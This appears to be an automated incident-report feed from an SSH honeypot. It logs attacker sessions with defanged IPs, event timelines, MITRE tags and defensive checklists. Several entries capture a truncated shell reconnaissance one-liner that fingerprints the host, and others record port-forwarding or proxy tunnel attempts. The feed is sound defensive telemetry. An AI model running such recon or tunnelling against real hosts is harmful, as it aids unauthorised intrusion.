### 🔴 HIGH · IR-2406ebe6bf65

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 11:00 |
| **Last Seen** | 2026-07-11 11:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:00:35` | `cowrie.session.connect` |
| `2026-07-11 11:00:35` | `cowrie.client.version` |
| `2026-07-11 11:00:36` | `cowrie.client.kex` |
| `2026-07-11 11:00:36` | `cowrie.login.success` |
| `2026-07-11 11:00:38` | `cowrie.session.params` |
| `2026-07-11 11:00:38` | `cowrie.command.input` |
| `2026-07-11 11:00:39` | `cowrie.log.closed` |
| `2026-07-11 11:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7588c34c4ac9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:02 |
| **Last Seen** | 2026-07-11 11:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:02:10` | `cowrie.session.connect` |
| `2026-07-11 11:02:11` | `cowrie.client.version` |
| `2026-07-11 11:02:11` | `cowrie.client.kex` |
| `2026-07-11 11:02:11` | `cowrie.login.success` |
| `2026-07-11 11:02:12` | `cowrie.session.params` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.success` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.command.input` |
| `2026-07-11 11:02:12` | `cowrie.log.closed` |
| `2026-07-11 11:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbfddc9037a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:04 |
| **Last Seen** | 2026-07-11 11:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:04:04` | `cowrie.session.connect` |
| `2026-07-11 11:04:04` | `cowrie.client.version` |
| `2026-07-11 11:04:04` | `cowrie.client.kex` |
| `2026-07-11 11:04:05` | `cowrie.login.success` |
| `2026-07-11 11:04:06` | `cowrie.session.params` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.success` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.command.input` |
| `2026-07-11 11:04:06` | `cowrie.log.closed` |
| `2026-07-11 11:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45064513800c

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:04 |
| **Last Seen** | 2026-07-11 11:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:04:19` | `cowrie.session.connect` |
| `2026-07-11 11:04:19` | `cowrie.client.version` |
| `2026-07-11 11:04:19` | `cowrie.client.kex` |
| `2026-07-11 11:04:23` | `cowrie.login.success` |
| `2026-07-11 11:04:23` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:04:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:04:23` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e149b7fc5c23

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-11 11:05 |
| **Last Seen** | 2026-07-11 11:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:05:30` | `cowrie.session.connect` |
| `2026-07-11 11:05:30` | `cowrie.client.version` |
| `2026-07-11 11:05:30` | `cowrie.client.kex` |
| `2026-07-11 11:05:33` | `cowrie.login.success` |
| `2026-07-11 11:05:33` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f5237d1bcc5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:05 |
| **Last Seen** | 2026-07-11 11:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:05:54` | `cowrie.session.connect` |
| `2026-07-11 11:05:54` | `cowrie.client.version` |
| `2026-07-11 11:05:54` | `cowrie.client.kex` |
| `2026-07-11 11:05:55` | `cowrie.login.success` |
| `2026-07-11 11:05:56` | `cowrie.session.params` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.success` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.command.input` |
| `2026-07-11 11:05:56` | `cowrie.log.closed` |
| `2026-07-11 11:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-974ee732151c

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:06 |
| **Last Seen** | 2026-07-11 11:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:06:24` | `cowrie.session.connect` |
| `2026-07-11 11:06:24` | `cowrie.client.version` |
| `2026-07-11 11:06:25` | `cowrie.client.kex` |
| `2026-07-11 11:06:26` | `cowrie.login.success` |
| `2026-07-11 11:06:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:06:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:06:26` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdf1080fa4ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:07 |
| **Last Seen** | 2026-07-11 11:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:07:42` | `cowrie.session.connect` |
| `2026-07-11 11:07:42` | `cowrie.client.version` |
| `2026-07-11 11:07:42` | `cowrie.client.kex` |
| `2026-07-11 11:07:43` | `cowrie.login.success` |
| `2026-07-11 11:07:44` | `cowrie.session.params` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.success` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:44` | `cowrie.command.input` |
| `2026-07-11 11:07:45` | `cowrie.log.closed` |
| `2026-07-11 11:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-476b8f8a75c8

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-11 11:09 |
| **Last Seen** | 2026-07-11 11:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:09:23` | `cowrie.session.connect` |
| `2026-07-11 11:09:24` | `cowrie.client.version` |
| `2026-07-11 11:09:24` | `cowrie.client.kex` |
| `2026-07-11 11:09:25` | `cowrie.login.success` |
| `2026-07-11 11:09:25` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:09:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd5cc94d8c5d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:09 |
| **Last Seen** | 2026-07-11 11:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:09:30` | `cowrie.session.connect` |
| `2026-07-11 11:09:31` | `cowrie.client.version` |
| `2026-07-11 11:09:31` | `cowrie.client.kex` |
| `2026-07-11 11:09:32` | `cowrie.login.success` |
| `2026-07-11 11:09:33` | `cowrie.session.params` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.success` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:33` | `cowrie.command.input` |
| `2026-07-11 11:09:34` | `cowrie.log.closed` |
| `2026-07-11 11:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dc12516f59c

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-07-11 11:09 |
| **Last Seen** | 2026-07-11 11:09 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:09:35` | `cowrie.session.connect` |
| `2026-07-11 11:09:36` | `cowrie.client.version` |
| `2026-07-11 11:09:36` | `cowrie.client.kex` |
| `2026-07-11 11:09:42` | `cowrie.login.success` |
| `2026-07-11 11:09:45` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4793133975d4

| Field | Detail |
|---|---|
| **Source IP** | `171.231.192[.]229` |
| **First Seen** | 2026-07-11 11:11 |
| **Last Seen** | 2026-07-11 11:12 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:11:04` | `cowrie.session.connect` |
| `2026-07-11 11:11:04` | `cowrie.client.version` |
| `2026-07-11 11:11:04` | `cowrie.client.kex` |
| `2026-07-11 11:11:39` | `cowrie.login.success` |
| `2026-07-11 11:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.192[.]229` to AbuseIPDB if not already reported
- [ ] Block `171.231.192[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc83ee1fc91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:11 |
| **Last Seen** | 2026-07-11 11:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:11:19` | `cowrie.session.connect` |
| `2026-07-11 11:11:19` | `cowrie.client.version` |
| `2026-07-11 11:11:19` | `cowrie.client.kex` |
| `2026-07-11 11:11:21` | `cowrie.login.success` |
| `2026-07-11 11:11:22` | `cowrie.session.params` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.success` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.command.input` |
| `2026-07-11 11:11:22` | `cowrie.log.closed` |
| `2026-07-11 11:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e33f5f126a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:13 |
| **Last Seen** | 2026-07-11 11:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:13:06` | `cowrie.session.connect` |
| `2026-07-11 11:13:07` | `cowrie.client.version` |
| `2026-07-11 11:13:07` | `cowrie.client.kex` |
| `2026-07-11 11:13:08` | `cowrie.login.success` |
| `2026-07-11 11:13:09` | `cowrie.session.params` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.success` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.command.input` |
| `2026-07-11 11:13:09` | `cowrie.log.closed` |
| `2026-07-11 11:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f976c1a5bd51

| Field | Detail |
|---|---|
| **Source IP** | `116.110.9[.]173` |
| **First Seen** | 2026-07-11 11:14 |
| **Last Seen** | 2026-07-11 11:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:14:19` | `cowrie.session.connect` |
| `2026-07-11 11:14:19` | `cowrie.client.version` |
| `2026-07-11 11:14:19` | `cowrie.client.kex` |
| `2026-07-11 11:14:21` | `cowrie.login.success` |
| `2026-07-11 11:14:21` | `cowrie.direct-tcpip.request` |
| `2026-07-11 11:14:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-11 11:14:21` | `cowrie.direct-tcpip.data` |
| `2026-07-11 11:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.9[.]173` to AbuseIPDB if not already reported
- [ ] Block `116.110.9[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92573dcd81e7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 11:14 |
| **Last Seen** | 2026-07-11 11:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:14:27` | `cowrie.session.connect` |
| `2026-07-11 11:14:28` | `cowrie.client.version` |
| `2026-07-11 11:14:28` | `cowrie.client.kex` |
| `2026-07-11 11:14:31` | `cowrie.login.success` |
| `2026-07-11 11:14:32` | `cowrie.session.params` |
| `2026-07-11 11:14:32` | `cowrie.command.input` |
| `2026-07-11 11:14:33` | `cowrie.log.closed` |
| `2026-07-11 11:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b89b0ce44580

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 11:14 |
| **Last Seen** | 2026-07-11 11:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 11:14:51` | `cowrie.session.connect` |
| `2026-07-11 11:14:51` | `cowrie.client.version` |
| `2026-07-11 11:14:51` | `cowrie.client.kex` |
| `2026-07-11 11:14:52` | `cowrie.login.success` |
| `2026-07-11 11:14:53` | `cowrie.session.params` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.input` |
| `2026-07-11 11:14:53` | `cowrie.command.success` |
